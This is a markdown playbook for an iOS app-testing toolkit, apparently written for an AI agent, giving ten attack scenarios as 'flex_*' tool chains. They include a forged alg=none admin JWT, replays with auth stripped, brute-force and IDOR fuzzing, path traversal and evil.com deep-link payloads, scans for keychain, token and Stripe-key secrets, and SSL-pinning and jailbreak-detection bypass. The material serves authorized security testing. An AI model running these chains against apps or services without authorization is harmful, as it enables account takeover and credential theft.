# Bug Bounty / Pentest Playbooks for iOS

Concrete attack scenarios, with the exact `flex_*` tool chain to run each one autonomously. Every playbook assumes you've already done:

```
flex_list_apps                       # find the bundle id
flex_connect(bundle_id)
flex_app_info                        # confirm target
```

Then exercised the app for a minute or two so `flex_requests` has real traffic.

---

## Playbook 1 — Initial recon (always run this first)

The first 5 minutes on a new target. Builds your attack-surface picture.

```
flex_app_info                                    # sandbox paths, version, identifiers
flex_entitlements                                # boundary: app groups, keychain groups, associated domains
flex_url_schemes                                 # registered deep link schemes
flex_modules(limit=50)                           # bundled frameworks (Firebase? OneSignal? Stripe?)
flex_files(path="")                              # walk the sandbox
flex_endpoints_map(count=500)                    # map every host + path the app talks to
flex_scan_vulnerabilities(count=500)             # surface the obvious wins
```

**What you're looking for:**
- `flex_entitlements` → shared keychain groups mean other apps in the same vendor's portfolio can read your tokens. Associated domains tell you which web origins are trusted for universal links.
- `flex_url_schemes` → every registered scheme is an attacker entry point. Test each with `flex_open_url`.
- `flex_endpoints_map` → look for "Internal" / "Admin" / "Debug" / "Staging" hostnames, old `/v1/` APIs alongside new `/v2/`, endpoints called only once (probably hidden features).
- `flex_modules` → outdated bundled SDK versions are a CVE goldmine. Cross-check versions with public advisories.

---

## Playbook 2 — Authentication weaknesses

### 2a. JWT misuse

```
# Find a request carrying a JWT
flex_search_requests(keyword="Bearer", search_bodies=False)
flex_request_details(index=N)                    # extract the Authorization header
flex_decode_jwt(token="eyJ...")                  # decode + auto-flag weak properties

# If alg=none flagged → try the attack
flex_replay_request(
    index=N,
    headers={"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."}
)                                                # 200 = broken auth
```

### 2b. Token reuse / replay-with-no-binding

```
flex_replay_request(index=N)                      # replay the original — does it succeed without anti-CSRF/nonce?
flex_replay_request(index=N, headers={"User-Agent": "attacker"})  # change UA — still works?
flex_replay_request(index=N, headers={"X-Forwarded-For": "1.2.3.4"})
```

If the server accepts every replay regardless of context, session binding is weak.

### 2c. Missing authorization (auth bypass / broken access control)

```
# Find a request that requires auth
flex_request_details(index=N)                    # has Authorization header

# Strip auth and replay
flex_replay_request(
    index=N,
    headers={"Authorization": "", "Cookie": ""}
)
```

If the response is still 200 with sensitive data, the endpoint trusts the URL alone (broken access control).

### 2d. Credential stuffing surface

```
# Find the login endpoint
flex_search_requests(keyword="login")
flex_request_details(index=N)

# Check rate limit
for _ in range(20):
    flex_replay_request(index=N, body='{"user":"x","pass":"wrong"}')

# If you never see 429, there is no rate limit.
```

---

## Playbook 3 — IDOR / BOLA (Broken Object Level Authorization)

Most common API bug. The killer combo.

```
# Find a request that fetches an object by id
flex_search_requests(keyword="users/")           # /users/<id>, /orders/<id>, etc.
flex_request_details(index=N)

# Numeric IDOR
flex_fuzz_request(
    index=N,
    target="path",                                # or "query:id"
    payload_set="idor_numeric",
)

# UUID IDOR (less likely to hit but worth trying)
flex_fuzz_request(index=N, target="path", payload_set="idor_uuid")
```

**Interpretation:**
- Status changes from `404` → `200` on a different id = you can enumerate
- Status `200` returning *different* user's data = confirmed IDOR
- Status `403` consistently = working access control (good)

---

## Playbook 4 — Injection sweep (SQLi / XSS / cmd / NoSQL)

Run all four against any parameter that looks server-evaluated.

```
flex_fuzz_request(index=N, target="query:q", payload_set="sqli")
flex_fuzz_request(index=N, target="query:q", payload_set="xss")
flex_fuzz_request(index=N, target="body", payload_set="cmd_inj")
flex_fuzz_request(index=N, target="body", payload_set="nosql")
```

The fuzzer's anomaly detector flags:
- SQL error signatures (`SQL syntax`, `ORA-`, `psycopg2`, ...)
- Path traversal hits (`root:x:`, `/bin/bash`)
- Command output (`uid=`, `gid=`, `Linux ...`)
- XSS reflection (payload appears in response body)
- 500-class server errors

Anything in `interesting` is worth a manual look.

---

## Playbook 5 — Deep link / URL scheme abuse

```
flex_url_schemes                                 # discover registered schemes

# For each scheme, hammer the handler
for scheme in schemes:
    flex_open_url(url=f"{scheme}://debug")
    flex_open_url(url=f"{scheme}://admin/settings")
    flex_open_url(url=f"{scheme}://x?cmd=../../etc/passwd")
    flex_open_url(url=f"{scheme}://x?redirect=https://evil.com")

# Watch what happens
flex_log_events(limit=200)                       # any URL-related logs
flex_requests(count=20)                          # any new network calls?
```

**What you're hunting:**
- Open redirects (the app's deep link handler forwards to attacker-supplied URL)
- Unauthenticated state changes (`app://settings/disable-2fa`)
- WebView injection (`app://browser?url=javascript:...`)
- Hidden debug menus

---

## Playbook 6 — Secrets in memory and on disk

```
# Static: extract every printable string from the decrypted binary
flex_dump_binary(output_path="./Target.decrypted")
flex_strings(path="./Target.decrypted", local=True, search="key", min_length=10)
flex_strings(path="./Target.decrypted", local=True, search="api", min_length=10)
flex_strings(path="./Target.decrypted", local=True, search="secret", min_length=10)

# Runtime: scan process memory for known tokens
flex_keychain                                    # get baseline tokens
# pick one, then:
flex_memory_scan(pattern="eyJhbGciOi", max_hits=50)   # find every JWT in memory
flex_memory_scan(pattern="sk_live_", max_hits=20)      # find Stripe keys

# Logs leak secrets surprisingly often
flex_logs(enable=True)
# ...exercise auth flow...
flex_log_events(limit=500)
flex_search_requests(keyword="password", search_bodies=True)   # creds in body?
```

---

## Playbook 7 — Crypto inspection

Find the key the moment the app uses it.

```
flex_crypto_hooks(enable=True)
# ...trigger encryption in the app (save a file, login, message)...
flex_crypto_logs(limit=200, clear=True)
```

For each event you get `{op, alg, key_len, key_hex, iv_hex, in_preview}`. If the same `key_hex` appears across launches, it's hardcoded — try `flex_strings` on the binary to confirm.

CommonCrypto only. If the app uses libsodium, BoringSSL, or hand-rolled crypto, identify its module with `flex_modules` and hook its exports with `flex_execute`.

---

## Playbook 8 — Persistent data plundering

```
flex_keychain                                    # passwords, tokens, OAuth refresh
flex_cookies                                     # session cookies (Secure/HttpOnly?)
flex_userdefaults                                # config and sometimes auth state
flex_sqlite_list                                 # find databases
flex_sqlite_query(path="...cache.db", sql="SELECT name FROM sqlite_master WHERE type='table'")
flex_sqlite_query(path="...cache.db", sql="SELECT * FROM users LIMIT 5")
flex_files(path="$HOME/Documents")               # look for plaintext PII files
flex_pasteboard                                  # apps sometimes leave stuff in clipboard
```

Look for: API keys, refresh tokens, biometric template paths, PII, payment info, decryption keys for app-encrypted data.

---

## Playbook 9 — In-flight request mutation (live debugging)

```
# Tag every request with a tracer (helps see what's authenticated)
flex_intercept_add(
    pattern="api.target.com",
    add_headers={"X-Debug-Trace": "pentest-2026"}
)

# Or strip auth from every API call to find unauthenticated endpoints
flex_intercept_add(
    regex=r"https?://api\.target\.com/v[12]/.*",
    remove_headers=["Authorization", "Cookie", "X-Api-Key"]
)

# Exercise the app. Check what still works.
flex_requests(count=100)
flex_intercept_logs()                            # see what was rewritten
flex_intercept_remove()                          # uninstall when done
```

---

## Playbook 10 — Anti-tampering bypass

If the app crashes/exits on jailbroken devices or detects MITM:

```
flex_jailbreak_bypass(enable=True)               # hide Cydia/Sileo/fork/etc.
flex_ssl_unpin(enable=True)                      # neuter pinning
flex_spawn(bundle_id)                            # restart fresh with bypasses live
```

If it still detects:
- `flex_trace_start` on `dlsym`, `sysctl`, `_dyld_image_count` — find inline checks
- `flex_strings(path="./Target.decrypted", local=True, search="jailbreak")` — find string-based checks
- Use `flex_execute` with `Interceptor.replace` to patch out the exact function once you find it

---

## Reporting checklist (per finding)

For each finding, the agent should collect:

1. **Title + severity** (use the CVSS-aligned levels from the scan tool: critical/high/medium/low/info)
2. **Endpoint** — host + path + method
3. **Original request** — `flex_request_details(index=N)`
4. **Exploit payload** — the modified request that proved the issue
5. **Response** — return value of `flex_replay_request(...)` showing the vuln triggering
6. **Reproduction steps** — minimal `flex_*` sequence to reproduce
7. **Impact** — what an attacker gains
8. **Recommendation** — what the developer should fix

Save these as you go — don't wait until the end.
